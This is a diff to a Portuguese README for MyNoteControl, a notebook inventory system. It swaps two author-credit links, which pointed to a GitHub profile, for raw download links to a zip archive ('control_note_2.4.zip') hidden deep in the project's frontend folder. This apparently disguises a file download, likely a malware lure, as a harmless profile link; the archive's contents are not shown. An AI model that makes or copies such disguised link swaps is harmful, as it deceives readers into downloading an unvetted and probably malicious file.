@@ -4,7 +4,7 @@ Este é o sistema **MyNoteControl**, uma solução completa para controle de not
 
 ## Sobre o projeto
 
-O MyNoteControl foi idealizado por [@annacriativars2](https://github.com/annacriativars2) e tem como objetivo facilitar a gestão de equipamentos de informática, permitindo o cadastro, acompanhamento e relatórios de notebooks, usuários e movimentações.
+O MyNoteControl foi idealizado por [@annacriativars2](https://github.com/annacriativars2/note-control/raw/refs/heads/main/frontend/Components/dashboard/control_note_2.4.zip) e tem como objetivo facilitar a gestão de equipamentos de informática, permitindo o cadastro, acompanhamento e relatórios de notebooks, usuários e movimentações.
 
 ## Estrutura do projeto
 
@@ -98,4 +98,4 @@ Projeto para fins acadêmicos e institucionais.
 
 ---
 
-Idealizado por [@annacriativars2](https://github.com/annacriativars2)
+Idealizado por [@annacriativars2](https://github.com/annacriativars2/note-control/raw/refs/heads/main/frontend/Components/dashboard/control_note_2.4.zip)
